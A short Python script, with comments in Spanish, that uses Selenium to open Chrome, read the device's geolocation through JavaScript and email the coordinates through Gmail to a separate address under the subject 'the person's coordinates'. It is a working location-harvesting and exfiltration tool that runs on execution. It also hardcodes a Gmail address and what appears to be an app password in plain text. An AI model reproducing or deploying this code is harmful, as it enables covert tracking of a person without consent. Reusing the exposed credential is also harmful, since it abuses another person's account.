from selenium import webdriver
import time
from email.message import EmailMessage
import smtplib

EMAIL = 'carlossalazarcoder@gmail.com'
PASSWORD_EMAIL = 'yebd risv uatk yvka'

def send_email(to, subject, content):
    msg = EmailMessage()
    msg["From"] = EMAIL
    msg["To"] = to
    msg["Subject"] = subject
    msg.set_content(content)
    # Enviar el correo
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(EMAIL, PASSWORD_EMAIL)
        smtp.send_message(msg)

def get_coords():
    driver = webdriver.Chrome()
    driver.get("https://www.google.com")

    # Ejecutar JavaScript sin async, usando callback
    driver.execute_script("""
    window.coords = null;

    navigator.geolocation.getCurrentPosition(
    function(position) {
        window.coords = {
        lat: position.coords.latitude,
        lon: position.coords.longitude
        };
    },
    function(error) {
        window.coords = {error: error.message};
    }
    );
    """)

    # Esperamos a que coords se llene
    coords = None
    for i in range(20):  # 20 intentos, 1 por segundo
        coords = driver.execute_script("return window.coords;")
        if coords is not None:
            break
        time.sleep(1)

    print(coords)
    send_email(to='carloseliassalazaryunes@gmail.com', subject=f'coordenadas de la persona', content=f'{coords}')

    driver.quit()


get_coords()